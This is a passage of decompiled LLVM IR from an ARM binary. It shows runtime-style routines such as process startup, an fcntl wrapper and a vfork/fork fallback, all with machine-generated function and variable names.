  store i32 %v0_10718, i32* %v2_10718, align 4
  %v17_107c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_10720:                               ; preds = %dec_label_pc_106e0
  %v2_10720 = load i32, i32* %stack_var_-424, align 4
  %v7_10724 = icmp eq i32 %v2_10720, 1
  %v2_1072c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1072c, i32* @r4, align 4
  br i1 %v7_10724, label %dec_label_pc_10734, label %dec_label_pc_10768

dec_label_pc_10734:                               ; preds = %dec_label_pc_10720
  store i32 %v2_1072c, i32* %r1.global-to-local, align 4
  store i32 %v2_1072c, i32* %r0.global-to-local, align 4
  %v2_1073c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1073c = call i32 @function_10e68(%timespec* %v2_1073c, i32 %v2_1072c)
  store i32 %v3_1073c, i32* %r0.global-to-local, align 4
  store i32 %v3_1073c, i32* %r6.global-to-local, align 4
  %v0_10744 = call i32 @function_cc08()
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 %v0_10744, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10758 = inttoptr i32 %v0_10744 to i32*
  %v2_10758 = load i32, i32* %v1_10758, align 4
  store i32 %v2_10758, i32* @r4, align 4
  %v3_1075c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_1075c = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_1075c, i32 0)
  store i32 %v4_1075c, i32* %r0.global-to-local, align 4
  %v0_10760 = load i32, i32* @r4, align 4
  %v1_10760 = load i32, i32* %r5.global-to-local, align 4
  %v2_10760 = inttoptr i32 %v1_10760 to i32*
  store i32 %v0_10760, i32* %v2_10760, align 4
  %v0_10790.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10790

dec_label_pc_10768:                               ; preds = %dec_label_pc_10720
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_10774 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10774 = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_10774, i32 0)
  store i32 %v4_10774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10784

dec_label_pc_10784:                               ; preds = %dec_label_pc_10698.dec_label_pc_10784_crit_edge, %dec_label_pc_10768
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_10698.dec_label_pc_10784_crit_edge ], [ %v2_1072c, %dec_label_pc_10768 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_10788 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10788 = call i32 @function_10e68(%timespec* %v2_10788, i32 %storemerge.pre-phi)
  store i32 %v3_10788, i32* %r0.global-to-local, align 4
  store i32 %v3_10788, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10734, %dec_label_pc_10784
  %v0_10790 = phi i32 [ %v0_10790.pr, %dec_label_pc_10734 ], [ %v3_10788, %dec_label_pc_10784 ]
  %v2_10790 = icmp eq i32 %v0_10790, 0
  br i1 %v2_10790, label %dec_label_pc_107b4, label %dec_label_pc_10798

dec_label_pc_10798:                               ; preds = %dec_label_pc_10790
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_107a0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_107a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10628, %dec_label_pc_10790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107bc:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_106cc, %dec_label_pc_10658
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %dec_label_pc_10798, %dec_label_pc_107b4, %dec_label_pc_106f8, %dec_label_pc_107bc
  %v17_107c4 = phi i32 [ %v3_107a0, %dec_label_pc_10798 ], [ 0, %dec_label_pc_107b4 ], [ %v17_107c4.pre, %dec_label_pc_106f8 ], [ -1, %dec_label_pc_107bc ]
  %v2_107c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_107c4, i32* @r4, align 4
  store i32 %v6_10628, i32* @r5, align 4
  store i32 %v9_10628, i32* @r6, align 4
  ret i32 %v17_107c4

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1072c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_106bc, { 0, 2, 1 }
  uselistorder i32 %v2_1067c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_10674, { 1, 0, 2 }
  uselistorder i32 %v2_10658, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10648, { 0, 2, 1 }
  uselistorder i32 %v16_10628, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 23, 10, 12, 13, 11, 15, 14, 17, 16, 22, 18, 24, 19, 21, 20, 1 }
  uselistorder i32 (i32, i32)* @function_131d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107c0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_107bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107b4, { 1, 0 }
  uselistorder label %dec_label_pc_10790, { 1, 0 }
  uselistorder label %dec_label_pc_10784, { 1, 0 }
  uselistorder label %dec_label_pc_106b4, { 1, 0 }
  uselistorder label %dec_label_pc_10640, { 1, 0 }
}

define i32 @function_107cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_107f8:
  %stack_var_-8 = alloca i32, align 4
  %v3_107cc = load i32, i32* @r4, align 4
  store i32 %v3_107cc, i32* %stack_var_-8, align 4
  %v2_107fc = load i32, i32* @global_var_21b34.491, align 4
  %v2_10800 = icmp eq i32 %v2_107fc, 0
  br i1 %v2_10800, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_107f8
  call void @__pseudo_branch(i32 %v2_107fc)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_107f8, %bb
  %v2_10810 = load i32, i32* @global_var_21b38.493, align 4
  %v2_10814 = icmp eq i32 %v2_10810, 0
  br i1 %v2_10814, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_10818 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_10818, i32* @r4, align 4
  %v9_10818 = load i32, i32* @r0, align 4
  ret i32 %v9_10818

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_10810)
  %v2_10824 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10824, i32* @r4, align 4
  %v8_10824 = load i32, i32* @r0, align 4
  ret i32 %v8_10824

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10838() local_unnamed_addr {
dec_label_pc_10838:
  ret i32 0
}

define i32 @function_10840() local_unnamed_addr {
dec_label_pc_10840:
  %v1_10840 = load i32, i32* @r0, align 4
  ret i32 %v1_10840
}

define i32 @function_10844(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10844:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10844 = load i32, i32* @r4, align 4
  store i32 %v3_10844, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_10854 = call i32 @function_10c48(i32 %arg1, i32 1)
  %v7_10858 = icmp eq i32 %v2_10854, -1
  br i1 %v7_10858, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_10844
  %v3_1085c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1085c, i32* @r4, align 4
  ret i32 %v2_10854

bb4:                                              ; preds = %dec_label_pc_10844
  %v0_10860 = load i32, i32* @r4, align 4
  %v4_10868 = call i32 @function_10e94(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_16970.496, i32 0, i32 0), i32 %v0_10860)
  %v1_1086c = load i32, i32* %r5.global-to-local, align 4
  %v9_1086c = icmp eq i32 %v4_10868, %v1_1086c
  br i1 %v9_1086c, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_10870 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10870, i32* @r4, align 4
  ret i32 %v4_10868

bb6:                                              ; preds = %bb4
  %v0_10874 = call i32 @function_fd08()
  %v0_10878 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10878, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v3_10878 = load i32, i32* @sb, align 4
  %v4_10878 = lshr i32 %v0_10874, %v3_10878
  %v5_10878 = sub i32 32, %v3_10878
  %v6_10878 = shl i32 %v0_10874, %v5_10878
  %v7_10878 = or i32 %v6_10878, %v4_10878
  %v9_10878 = and i32 %v7_10878, %v0_10860
  store i32 %v9_10878, i32* @r6, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_10874

; uselistorder directives
  uselistorder i32 %v0_10874, { 0, 2, 1 }
  uselistorder i32 %v2_10854, { 1, 0 }
  uselistorder i32 ()* @function_fd08, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1087c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1087c:
  %v2_10880 = load i32, i32* @global_var_21b3c.498, align 4
  %v2_10884 = icmp eq i32 %v2_10880, 0
  br i1 %v2_10884, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1087c
  %v6_10890 = load i32, i32* @r0, align 4
  ret i32 %v6_10890

bb3:                                              ; preds = %dec_label_pc_1087c
  store i32 1, i32* @global_var_21b3c.498, align 4
  store i32 4096, i32* @global_var_21b30.432, align 4
  %v0_108c4 = call i32 @function_d4d4()
  ret i32 %v0_108c4
}

define i32 @function_108d8(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_108d8:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_108dc = mul i32 %arg2, 4
  %v5_108dc = add i32 %tmp, %v4_108dc
  %v2_108e0 = load i32, i32* %arg3, align 4
  %v2_108e4 = ptrtoint i32* %stack_var_-120 to i32
  %v1_108e8 = add i32 %v5_108dc, 4
  store i32 %v1_108e8, i32* @ip, align 4
  %v9_108ec = icmp eq i32 %v1_108e8, %v2_108e0
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_21b28.504, align 4
  store i32 %v1_108e8, i32* @global_var_21b2c.485, align 4
  store i32 %arg6, i32* @global_var_21b38.493, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_108ec, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_108d8
  store i32 %v5_108dc, i32* @global_var_21b2c.485, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_108d8, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_1092c = bitcast i32* %stack_var_-120 to i8*
  %v3_1092c = call i32 @function_ec20(i8* %v2_1092c, i32 0)
  %storemerge.pre = load i32, i32* @global_var_21b2c.485, align 4
  br label %dec_label_pc_1093c

dec_label_pc_1093c:                               ; preds = %dec_label_pc_1093c, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_1093c, %dec_label_pc_1093c ]
  %v1_1093c = inttoptr i32 %storemerge to i32*
  %v2_1093c = load i32, i32* %v1_1093c, align 4
  %v4_1093c = add i32 %storemerge, 4
  %v2_10940 = icmp eq i32 %v2_1093c, 0
  br i1 %v2_10940, label %dec_label_pc_1094c, label %dec_label_pc_1093c

dec_label_pc_1094c:                               ; preds = %dec_label_pc_1093c
  store i32 %v4_1093c, i32* @r4, align 4
  %v1_1096c22 = inttoptr i32 %v4_1093c to i32*
  %v2_1096c23 = load i32, i32* %v1_1096c22, align 4
  %v2_1097025 = icmp eq i32 %v2_1096c23, 0
  br i1 %v2_1097025, label %dec_label_pc_10978, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %dec_label_pc_1094c, %dec_label_pc_1096c
  %v5_10958 = phi i32 [ %v2_1096c, %dec_label_pc_1096c ], [ %v2_1096c23, %dec_label_pc_1094c ]
  %v2_10954 = icmp ugt i32 %v5_10958, 13
  %v7_10954 = icmp eq i32 %v5_10958, 14
  %v2_10958 = xor i1 %v2_10954, true
  %v3_10958 = or i1 %v7_10954, %v2_10958
  br i1 %v3_10958, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10954
  %v6_10958 = and i32 %v5_10958, 536870912
  %v7_10958 = icmp ne i32 %v6_10958, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10954, %bb42
  %v1_10964 = phi i1 [ %v2_10954, %dec_label_pc_10954 ], [ %v7_10958, %bb42 ]
  %v2_1095c = xor i1 %v1_10964, true
  %v3_1095c = or i1 %v7_10954, %v2_1095c
  br i1 %v3_1095c, label %bb44, label %dec_label_pc_1096c

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_1095c, i32 ptrtoint ([3 x i8]* @global_var_ec10.405 to i32))
  %v0_10968 = load i32, i32* @r4, align 4
  %v1_10968 = add i32 %v0_10968, 8
  store i32 %v1_10968, i32* @r4, align 4
  %v1_1096c = inttoptr i32 %v1_10968 to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  %v2_10970 = icmp eq i32 %v2_1096c, 0
  br i1 %v2_10970, label %dec_label_pc_10978, label %dec_label_pc_10954

dec_label_pc_10978:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_1094c
  %v1_1097c = call i32 @function_13218(i32 %v2_108e4)
  store i32 %v1_1097c, i32* @r0, align 4
  %v1_10980 = call i32 @function_1087c(i32 %v1_1097c)
  store i32 %v1_10980, i32* @r0, align 4
  %v2_1098c = icmp eq i32 %tmp37, 0
  br i1 %v2_1098c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10978
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10978, %bb45
  %v0_1099c = phi i32 [ %tmp37, %dec_label_pc_10978 ], [ 4096, %bb45 ]
  %v3_10994 = icmp eq i32 %tmp36, -1
  %v8_10994 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_21b30.432 to i32), i32* @r2, align 4
  store i32 %v0_1099c, i32* @global_var_21b30.432, align 4
  br i1 %v3_10994, label %dec_label_pc_109a4, label %dec_label_pc_109cc

dec_label_pc_109a4:                               ; preds = %bb46
  %v0_109a4 = call i32 @function_10e3c()
  store i32 %v0_109a4, i32* @r0, align 4
  store i32 %v0_109a4, i32* @r4, align 4
  %v0_109ac = call i32 @function_10de4()
  %v0_109b0 = load i32, i32* @r4, align 4
  %v9_109b0 = icmp eq i32 %v0_109b0, %v0_109ac
  br i1 %v9_109b0, label %dec_label_pc_109b8, label %dec_label_pc_109f4

dec_label_pc_109b8:                               ; preds = %dec_label_pc_109a4
  %v1_109b8 = call i32 @function_10e10(i32 %v0_109ac)
  store i32 %v1_109b8, i32* @r0, align 4
  store i32 %v1_109b8, i32* @r4, align 4
  %v0_109c0 = call i32 @function_10db8()
  %v0_109c4 = load i32, i32* @r4, align 4
  %v9_109c4 = icmp eq i32 %v0_109c4, %v0_109c0
  br i1 %v9_109c4, label %dec_label_pc_109cc, label %dec_label_pc_109f4

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109b8, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_10994, label %dec_label_pc_10a60, label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %dec_label_pc_109cc
  %v9_109dc = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_109dc, label %dec_label_pc_109e4, label %dec_label_pc_109f4

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109d8
  br label %dec_label_pc_109f4

dec_label_pc_109f4:                               ; preds = %dec_label_pc_109e4, %dec_label_pc_109d8, %dec_label_pc_109b8, %dec_label_pc_109a4
  %v2_109fc = call i32 @function_10844(i32 0, i32 32768)
  %v2_10a08 = call i32 @function_10844(i32 1, i32 32770)
  %v2_10a14 = call i32 @function_10844(i32 2, i32 32770)
  br label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_109f4, %dec_label_pc_109cc
  %v0_10a24 = load i32, i32* @r6, align 4
  %v1_10a24 = inttoptr i32 %v0_10a24 to i32*
  %v2_10a24 = load i32, i32* %v1_10a24, align 4
  store i32 %v2_10a24, i32* @global_var_1f498, align 4
  store i32 %arg5, i32* @global_var_21b34.491, align 4
  %v2_10a60 = icmp eq i32 %arg4, 0
  br i1 %v2_10a60, label %dec_label_pc_10a9c, label %bb47

bb47:                                             ; preds = %dec_label_pc_10a60
  br label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a60, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_10aac = call i32 @function_cc08()
  %v2_10ab4 = inttoptr i32 %v1_10aac to i32*
  store i32 0, i32* %v2_10ab4, align 4
  %v1_10ac8 = call i32 @function_11004()
  %v2_10ad0 = inttoptr i32 %v1_10ac8 to i32*
  store i32 0, i32* %v2_10ad0, align 4
  %v0_10ae0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_10aec = call i32 @function_10500(i32 %v0_10ae0)
  ret i32 %v1_10aec

; uselistorder directives
  uselistorder i32 %v2_1096c, { 1, 0 }
  uselistorder i32 %v1_10968, { 1, 0 }
  uselistorder i1 %v2_10954, { 1, 0 }
  uselistorder i32 %v4_1093c, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_10500, { 0, 20, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 19, 18, 17, 16 }
  uselistorder i32 (i32, i32)* @function_10844, { 2, 1, 0 }
  uselistorder i32* @global_var_21b30.432, { 1, 4, 0, 2, 3 }
  uselistorder i32 4096, { 0, 1, 6, 2, 7, 3, 4, 5 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10a9c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_1096c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_10954, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_10b24(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b24:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_10b24 = load i32, i32* @r4, align 4
  %v6_10b24 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_10b28 = icmp eq i32* %arg2, null
  %v2_10b2c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_10b28, label %dec_label_pc_10b98, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b24
  %v2_10b40 = load i32, i32* %arg2, align 4
  %v4_10b40 = add i32 %tmp, 4
  store i32 %v4_10b40, i32* @r1, align 4
  %v2_10b44 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_10b44, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_10b40, i32* %stack_var_-156, align 4
  %v0_10b50 = call i32 @function_ec10()
  store i32 %v0_10b50, i32* %r0.global-to-local, align 4
  %v0_10b54 = load i32, i32* @r4, align 4
  %v1_10b54 = add i32 %v0_10b54, 132
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  %v1_10b58 = and i32 %v3_10b54, 67108864
  %v2_10b58 = icmp eq i32 %v1_10b58, 0
  br i1 %v2_10b58, label %dec_label_pc_10b6c, label %bb

bb:                                               ; preds = %dec_label_pc_10b3c
  br label %dec_label_pc_10b88

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b3c
  %v1_10b74 = and i32 %v3_10b54, 4
  %v2_10b74 = icmp eq i32 %v1_10b74, 0
  br i1 %v2_10b74, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_10b6c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_10b6c, %bb20
  br label %dec_label_pc_10b88

dec_label_pc_10b88:                               ; preds = %bb, %bb21
  %v2_10b88 = icmp eq i32 %v0_10b54, 0
  %v3_10b8c = ptrtoint i32* %stack_var_-156 to i32
  %.v3_10b8c = select i1 %v2_10b88, i32 0, i32 %v3_10b8c
  %v0_10b98.pre = load i32, i32* @r5, align 4
  %v0_10ba8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b98

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b88, %dec_label_pc_10b24
  %v0_10ba8 = phi i32 [ %arg1, %dec_label_pc_10b24 ], [ %v0_10ba8.pre, %dec_label_pc_10b88 ]
  %v0_10b98 = phi i32 [ %arg3, %dec_label_pc_10b24 ], [ %v0_10b98.pre, %dec_label_pc_10b88 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10b24 ], [ %.v3_10b8c, %dec_label_pc_10b88 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_10b98 = icmp eq i32 %v0_10b98, 0
  %.v2_10b2c = select i1 %v2_10b98, i32 0, i32 %v2_10b2c
  store i32 %.v2_10b2c, i32* @r2, align 4
  store i32 %v0_10ba8, i32* %r0.global-to-local, align 4
  %v1_10bac = call i32 @function_10d0c(i32 %v0_10ba8)
  store i32 %v1_10bac, i32* %r0.global-to-local, align 4
  %v0_10bb0 = load i32, i32* @r5, align 4
  %v2_10bb0 = icmp eq i32 %v0_10bb0, 0
  br i1 %v2_10bb0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_10b98
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_10b98, %bb25
  %v0_10bc0.pr = phi i32 [ 0, %dec_label_pc_10b98 ], [ 1, %bb25 ]
  %v1_10bb8 = icmp slt i32 %v1_10bac, 0
  br i1 %v1_10bb8, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_10bf4

thread-pre-split:                                 ; preds = %bb26
  %v2_10bc0 = icmp eq i32 %v0_10bc0.pr, 0
  store i32 %v1_10bac, i32* @r4, align 4
  br i1 %v2_10bc0, label %dec_label_pc_10bf4, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %thread-pre-split
  %v2_10bcc = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_10bb0, i32* %r0.global-to-local, align 4
  %v2_10bd4 = inttoptr i32 %v0_10bb0 to i32*
  store i32 %v2_10bcc, i32* %v2_10bd4, align 4
  %v3_10bd4 = load i32, i32* %r0.global-to-local, align 4
  %v4_10bd4 = add i32 %v3_10bd4, 4
  store i32 %v4_10bd4, i32* @r0, align 4
  %v2_10bd8 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_10bd8, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_10be0 = call i32 @function_ec10()
  store i32 %v0_10be0, i32* %r0.global-to-local, align 4
  %v1_10be8 = load i32, i32* @r5, align 4
  %v2_10be8 = add i32 %v1_10be8, 136
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  %v1_10bf0 = load i32, i32* @r5, align 4
  %v2_10bf0 = add i32 %v1_10bf0, 132
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  %v0_10bf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_10bcc
  %v0_10bf4 = phi i32 [ %v1_10bac, %thread-pre-split ], [ %v0_10bf4.pre, %dec_label_pc_10bcc ], [ %v1_10bac, %thread-pre-split.thread ]
  store i32 %v0_10bf4, i32* %r0.global-to-local, align 4
  store i32 %v3_10b24, i32* @r4, align 4
  store i32 %v6_10b24, i32* @r5, align 4
  ret i32 %v0_10bf4

; uselistorder directives
  uselistorder i32 %v0_10bf4, { 1, 0 }
  uselistorder i32 %v0_10bb0, { 1, 0, 2 }
  uselistorder i32 %v0_10ba8, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_10bf4, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_10b88, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_10c10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c10:
  %v0_10c10 = call i32 @vfork()
  store i32 %v0_10c10, i32* @r0, align 4
  %v2_10c14 = icmp ugt i32 %v0_10c10, -4097
  br i1 %v2_10c14, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_10c28, %dec_label_pc_10c10
  %merge = phi i32 [ %v0_10c10, %dec_label_pc_10c10 ], [ %v0_10c28, %dec_label_pc_10c28 ]
  ret i32 %merge

bb1:                                              ; preds = %dec_label_pc_10c10
  %v4_10c20 = icmp eq i32 %v0_10c10, -38
  br i1 %v4_10c20, label %dec_label_pc_10c28, label %bb2

dec_label_pc_10c28:                               ; preds = %bb1
  %v0_10c28 = call i32 @fork()
  store i32 %v0_10c28, i32* @r0, align 4
  %v2_10c2c = icmp ugt i32 %v0_10c28, -4097
  br i1 %v2_10c2c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_10c28
  %v0_10c34 = call i32 @function_13278()
  %v1_10c3c = inttoptr i32 %v0_10c34 to %sigcontext*
  %v3_10c40 = call i32 @sigreturn(%sigcontext* %v1_10c3c)
  %v4_10c40 = inttoptr i32 %v3_10c40 to %sigcontext*
  %v3_10c44 = call i32 @sigreturn(%sigcontext* %v4_10c40)
  ret i32 %v3_10c44

; uselistorder directives
  uselistorder i32 %v0_10c28, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c48:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_10c48 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_10c58 = add i32 %arg2, -12
  store i32 %v6_10c48, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_10c58, 2
  br i1 %tmp, label %dec_label_pc_10c80, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c48
  %v0_10c78 = call i32 @function_10cbc()
  br label %dec_label_pc_10cac

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c48
  %v2_10c88 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_10c88, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_10c88, -4095
  br i1 %tmp8, label %dec_label_pc_10cac, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c80
  %v0_10c98 = call i32 @function_cc08()
  %v0_10c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_10c9c = sub i32 0, %v0_10c9c
  %v2_10ca0 = inttoptr i32 %v0_10c98 to i32*
  store i32 %v1_10c9c, i32* %v2_10ca0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10c80, %dec_label_pc_10c78
  %storemerge = phi i32 [ %v0_10c78, %dec_label_pc_10c78 ], [ %v2_10c88, %dec_label_pc_10c80 ], [ -1, %dec_label_pc_10c98 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10c88, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @function_10cbc() local_unnamed_addr {
dec_label_pc_10cbc:
  %r4.global-to-local = alloca i32, align 4
  %v0_10cdc = load i32, i32* @r0, align 4
  store i32 %v0_10cdc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cdc, -4095
